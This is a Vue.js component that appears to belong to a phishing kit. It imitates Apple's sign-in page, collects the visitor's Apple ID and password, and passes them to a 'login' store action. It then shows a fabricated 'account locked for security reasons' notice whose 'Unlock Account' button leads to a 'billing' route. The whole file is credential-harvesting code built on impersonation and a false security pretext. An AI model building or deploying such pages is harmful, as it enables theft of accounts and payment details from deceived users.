<template>
  <div class="mainque auth--margin-top">
    <transition name="fade">
      <div v-if="tab === 'loading'">
        <SpinnerLoading />
      </div>
    </transition>
    <transition name="fade">
      <div v-if="tab === 'login'">
        <img :src="require('../assets/image/logo.png')" style="width: 200px;">
        <h3>
          Manage your Apple account
        </h3>
        <form @submit.prevent="onSubmit">
          <input type="text" class="form--auth" style="color: black;" :class="{ 'form--auth-remove': step.password, 'form--auth--one': !step.password }" placeholder="Apple ID" v-model="email">
          <span v-if="!step.password">
            <button v-if="!loading" type="submit" class="btn icon-sign" :class="{ 'icon-dark': !validEmail, 'icon-light': validEmail }" @click.prevent="emailSubmit()" :disabled="!validEmail">
              <i class="icon icon_sign_in"></i>
            </button>
            <button v-else type="button" class="btn spinner--gif" disabled>
              <img :src="require('../assets/image/spinner.gif')">
            </button>
          </span>
          <slide-y-up-transition :duration="500">
            <div v-if="step.password">
              <input type="password" style="color: black;" ref="password" class="form--auth form--auth-two" placeholder="password" v-model="password">
              <button v-if="!loading" type="submit" class="btn icon-sign" :class="{ 'icon-dark': !validPassword, 'icon-light': validPassword }" @click.prevent="passwordSubmit()" :disabled="!validPassword">
                <i class="icon icon_sign_in"></i>
              </button>
              <button v-else type="button" class="btn spinner--gif" disabled>
                <img :src="require('../assets/image/spinner.gif')">
              </button>
            </div>
          </slide-y-up-transition>
          <fade-transition>
            <div class="pop-container error signin-error" v-if="error && step.password">
              <div class="error pop-bottom tk-subbody-headline">
                <p class="fat" id="errMsg">
                  Your Apple&nbsp;ID or password was incorrect.
                </p>
              </div>
            </div>
          </fade-transition>
        </form>
      </div>
    </transition>
    <transition name="fade">
      <div v-if="tab === 'next'">
        <div class="card--auth">
          <h2>
            This Apple ID has been locked for security reasons.
          </h2>
          <p>
            You must unlock your account before signing in.
          </p>
          <div class="footer--button">
            <button class="cancel--button" @click.prevent="tab = 'login', loading = false" ype="button">Go back</button>
            <router-link :to="{ name: 'billing', params: { appleid: email } }" class="unlock--button" type="button">Unlock Account</router-link>
          </div>
        </div>
      </div>
    </transition>
  </div>
</template>
<script>
  import SpinnerLoading from '@/components/SpinnerLoading.vue'
  export default {
    components: { SpinnerLoading },
    mounted() {
      setTimeout(() => {
        this.tab  = 'login'
      }, 1000)
    },
    data() {
      return {

        tab: 'loading',

        email: '',
        password: '',

        step: {
          email: true,
          password: false
        },

        validEmail: false,
        validPassword: false,
        loading: false,
        error: false
      }
    },
    watch: {
      email(e) {
        this.validEmail  = false
        if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(e)) {
          this.validEmail     = true
        } else {
          this.step.password  = false
        }
      },
      password(e) {
        this.validPassword  = false
        if (e.length >= 6) {
          this.validPassword  = true
        }
      }
    },
    computed: {

    },
    methods: {
      onSubmit() {
        if (!this.step.password) {
          this.emailSubmit()
        } else {
          this.passwordSubmit()
        }
      },

      emailSubmit() {
        this.loading  = true
        this.error    = false
        setTimeout(() => {
          this.step.password  = true
          this.loading        = false
          this.$nextTick(() => this.$refs.password.focus())
        }, 1000)
      },
      async passwordSubmit() {
        this.error      = false
        this.loading    = true
        await this.$store.dispatch('login', { email: this.email, password: this.password })
        .then((e) => {
          if (e) {
            this.tab      = 'next'
          } else {
            this.error  = true
          }
        })
        this.loading  = false
      }
    }
  }
</script>
